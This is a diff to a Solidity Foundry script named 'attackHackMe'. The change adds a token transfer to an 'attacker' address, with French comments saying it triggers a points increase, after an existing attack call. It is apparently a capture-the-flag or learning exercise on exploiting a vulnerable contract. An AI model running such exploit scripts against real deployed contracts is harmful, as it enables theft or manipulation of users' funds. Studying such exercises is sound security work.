@@ -90,6 +90,12 @@ contract attackHackMe is Script {
         attackAddPoint.attack();
         console.log("Attack with addPoint executed");
 
+         // Effectuer un transfert pour déclencher l'augmentation des points
+        address attacker = address(this);
+        hackMeContract.transfer(attacker, 1); // Transférer une petite somme pour le test
+        console.log("Transfer executed");
+        
+
 
         vm.stopBroadcast();
     }
